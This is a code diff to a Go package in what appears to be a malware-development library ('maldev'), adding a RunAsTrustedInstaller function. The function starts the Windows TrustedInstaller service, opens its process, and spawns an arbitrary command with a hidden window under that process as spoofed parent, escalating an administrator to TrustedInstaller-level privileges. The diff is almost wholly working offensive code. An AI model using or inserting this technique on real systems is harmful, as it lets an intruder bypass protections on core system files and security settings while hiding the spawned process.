@@ -4,8 +4,11 @@
 package impersonate
 
 import (
+	"fmt"
 	"os"
+	"os/exec"
 	"runtime"
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sync/errgroup"
@@ -14,6 +17,34 @@ import (
 	"github.com/oioio-space/maldev/win/api"
 	"github.com/oioio-space/maldev/win/token"
 )
+
+var (
+	procOpenSCManagerW       = api.Advapi32.NewProc("OpenSCManagerW")
+	procOpenServiceW         = api.Advapi32.NewProc("OpenServiceW")
+	procStartServiceW        = api.Advapi32.NewProc("StartServiceW")
+	procQueryServiceStatusEx = api.Advapi32.NewProc("QueryServiceStatusEx")
+	procCloseServiceHandle   = api.Advapi32.NewProc("CloseServiceHandle")
+)
+
+const (
+	scManagerConnect    = 0x0001
+	serviceQueryStatus  = 0x0004
+	serviceStart        = 0x0010
+	serviceRunning      = 0x00000004
+	scStatusProcessInfo = 0
+)
+
+type serviceStatusProcess struct {
+	ServiceType             uint32
+	CurrentState            uint32
+	ControlsAccepted        uint32
+	Win32ExitCode           uint32
+	ServiceSpecificExitCode uint32
+	CheckPoint              uint32
+	WaitHint                uint32
+	ProcessID               uint32
+	ServiceFlags            uint32
+}
 
 // LogonType represents the type of logon operation.
 type LogonType uint32
@@ -131,4 +162,80 @@ func ImpersonateThread(isInDomain bool, domain, username, password string, callb
 	}
 
 	return runImpersonated(wt.Token(), callbackFunc)
+}
+
+// RunAsTrustedInstaller spawns cmd with args as a child of the TrustedInstaller
+// service process (NT SERVICE\TrustedInstaller), giving it TI-level privileges.
+// Requires admin + SeDebugPrivilege.
+//
+// The returned *exec.Cmd has already been started. The caller is responsible
+// for calling cmd.Wait().
+func RunAsTrustedInstaller(cmd string, args ...string) (*exec.Cmd, error) {
+	tiPID, err := startAndFindTI()
+	if err != nil {
+		return nil, err
+	}
+
+	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, tiPID)
+	if err != nil {
+		return nil, fmt.Errorf("open TrustedInstaller process: %w", err)
+	}
+	defer windows.CloseHandle(parentHandle)
+
+	c := exec.Command(cmd, args...)
+	c.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		ParentProcess: syscall.Handle(parentHandle),
+	}
+
+	if err := c.Start(); err != nil {
+		return nil, fmt.Errorf("start command: %w", err)
+	}
+	return c, nil
+}
+
+// startAndFindTI ensures the TrustedInstaller service is running and returns its PID.
+func startAndFindTI() (uint32, error) {
+	scName, _ := windows.UTF16PtrFromString("TrustedInstaller")
+	emptyStr, _ := windows.UTF16PtrFromString("")
+
+	hSCM, _, err := procOpenSCManagerW.Call(
+		uintptr(unsafe.Pointer(emptyStr)),
+		0,
+		uintptr(scManagerConnect),
+	)
+	if hSCM == 0 {
+		return 0, fmt.Errorf("OpenSCManager: %w", err)
+	}
+	defer procCloseServiceHandle.Call(hSCM) //nolint:errcheck
+
+	hSvc, _, err := procOpenServiceW.Call(
+		hSCM,
+		uintptr(unsafe.Pointer(scName)),
+		uintptr(serviceQueryStatus|serviceStart),
+	)
+	if hSvc == 0 {
+		return 0, fmt.Errorf("OpenService(TrustedInstaller): %w", err)
+	}
+	defer procCloseServiceHandle.Call(hSvc) //nolint:errcheck
+
+	// Start the service — idempotent if already running.
+	procStartServiceW.Call(hSvc, 0, 0) //nolint:errcheck
+
+	var ssp serviceStatusProcess
+	needed := uint32(unsafe.Sizeof(ssp))
+	r, _, err := procQueryServiceStatusEx.Call(
+		hSvc,
+		uintptr(scStatusProcessInfo),
+		uintptr(unsafe.Pointer(&ssp)),
+		uintptr(needed),
+		uintptr(unsafe.Pointer(&needed)),
+	)
+	if r == 0 {
+		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
+	}
+	if ssp.CurrentState != serviceRunning {
+		return 0, fmt.Errorf("TrustedInstaller service not running (state=%d)", ssp.CurrentState)
+	}
+	return ssp.ProcessID, nil
 }
